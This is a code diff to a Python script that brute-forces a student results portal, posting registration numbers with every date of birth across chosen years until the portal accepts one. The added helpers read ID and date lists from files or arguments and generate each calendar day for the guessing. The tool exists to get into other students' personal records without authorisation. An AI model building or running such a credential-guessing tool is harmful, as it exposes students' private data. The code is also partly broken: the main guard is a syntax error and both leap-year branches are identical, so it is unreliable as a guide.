@@ -52,7 +52,70 @@ def connection_send_package(roll_no, date_of_brith):
     payload = {'regno':roll_no, 'dob': date_of_brith, 'B1':'Get Marks'}
     responce = post(url, headers=header, data=payload)
     return responce
+    
+def open_datasheet(path):
+    with open(path,'r') as file:
+        data=[]
+        lines = file.readlines()
+        for line in lines:  data.append(line.replace('\n',''))
+        return data
+        
+def leaf_year(year):
 
+    if year%400 == 0:   leap = True
+    elif year%100 == 0: leap = False
+    elif year%4 == 0:   leap = True
+    else:   leap = False
+    return leap
+    
+def render_day(year):    
+    date = datetime.strptime(f"01/01/{year}","%d/%m/%Y")
+    data = [f"{year}-01-01"]
+    
+    if leaf_year(year): #spcieal for leap year guys
+            for d in range(365):
+                date += timedelta(days=1)
+                data.append(str(date)[0:10])
+    else:
+            for d in range(365):
+                date += timedelta(days=1)
+                data.append(str(date)[0:10])
+    return data
+
+
+def modify(day):
+    ds= day.split("-")
+    return str(f"{ds[2]}/{ds[1]}/{ds[0]}")
+        
+def dob_input_manager(text):
+	if '/' in text: return text.split(',')
+	else:
+	     years = text.split(',')
+	     dates, data = [], []
+	     
+	     if  str(years[0][-4:]) == '.txt':  return open_datasheet(str(years[0]))
+	     
+	     elif len(years[0]) ==10:
+	         for year in years: dates.append(year)
+	         return dates
+	     else:
+	         for year in years:
+	                for date in render_day(year):   data.append(date)
+	         for day in data:   dates.append(modify(day))
+	         return dates
+
+def register_no_input_manager(argv):
+
+    info = argv.split(",")
+    data=[]
+    
+    if str(info[0][-4:]) == '.txt':
+        return open_datasheet(str(info[0]))     
+    else:
+        for id in info:
+            data.append(id)
+        return data
+    
 def students_dictionary_attack( collaction_of_roll_no, collaction_of_date_of_brith):
     
     total_number_of_Id = 0
@@ -75,6 +138,18 @@ def students_dictionary_attack( collaction_of_roll_no, collaction_of_date_of_bri
             
             if Details['valid']:    break
             
-
+def get_input():
+    roll_no, date_of_brith=0,0
+    
+    if  len(sys.argv) >= 2:
+        roll_no = register_no_input_manager(sys.argv[1])
+        date_of_brith = dob_input_manager(sys.argv[2])
+    
+    else:
+        roll_no = register_no_input_manager(input("Regno -> "))
+        date_of_brith = dob_input_manager(input("Dob  -> "))
+        
+    return roll_no, date_of_brith
+    
 if __name__ = '__main__':
     pass
